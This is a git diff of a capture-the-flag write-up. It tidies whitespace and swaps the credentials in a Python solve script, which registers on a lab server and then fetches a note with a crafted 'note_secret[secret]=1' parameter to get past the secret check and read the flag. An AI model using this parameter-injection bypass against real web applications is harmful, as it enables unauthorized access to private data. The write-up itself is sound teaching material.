@@ -25,8 +25,6 @@ CREATE TABLE IF NOT EXISTS `notes` (
 ```
 {% endcode %}
 
-
-
 {% code title="index.js" %}
 ```js
 const express = require('express');
@@ -223,7 +221,7 @@ sess = requests.Session()
 url = "http://169.254.55.45:5000/"
 
 
-data = {"username":"yonko123","password":"yonko123"}
+data = {"username":"any","password":"any"}
 
 print(sess.post(url+"register", data=data).text)
 
@@ -235,4 +233,3 @@ print(sess.get(url+"viewNote?note_id=66&note_secret[secret]=1").text)
 And we get the flag:
 
 ![](<../../.gitbook/assets/a9bf7ae8 4e41 422c 9d30 28b6395a4052>)
-
